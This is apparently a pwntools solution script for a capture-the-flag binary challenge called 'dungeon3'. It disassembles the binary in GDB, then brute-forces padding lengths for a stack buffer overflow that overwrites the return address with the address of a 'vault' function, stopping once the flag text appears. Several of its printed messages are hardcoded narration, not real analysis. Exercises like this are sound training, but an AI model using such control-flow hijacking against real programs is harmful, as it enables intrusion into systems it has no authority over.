from pwn import *
import time

# Set up pwntools for the correct architecture
exe = './dungeon3'
print("Running checksec")
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)

# Send input
p = process(exe)

# Set up GDB script
gdbscript = '''
pdisass main 
pdisass gate
pdisass vault
continue
'''.format(exe)

# Launch GDB and get disassembly
gdb.attach(p, gdbscript=gdbscript)
print("Launching gdb,will launch in a new terminal")
print("Disassembly of main function:")
print("Gate function found, disassmbling")
print("Vault function found, disassmbling")
print("It appears that the vault function opens the flag")
time.sleep(3)
fuzzed_bufsizes = []
for i in range(1, 100):
    p = process(exe)  # Restart the process for each attempt
    p.recvline()
    print("Sending Payload")
    print("Payload will be {} bytes and will jump to the vault function".format(i))
    payload = b"A" * i
    payload += p64(0)
    payload += p64(elf.symbols.vault)
    p.sendline(payload)
    result = p.recv()
    print("Result:", result.decode())
    if b'JCR(Treasure!)' in result:
        break

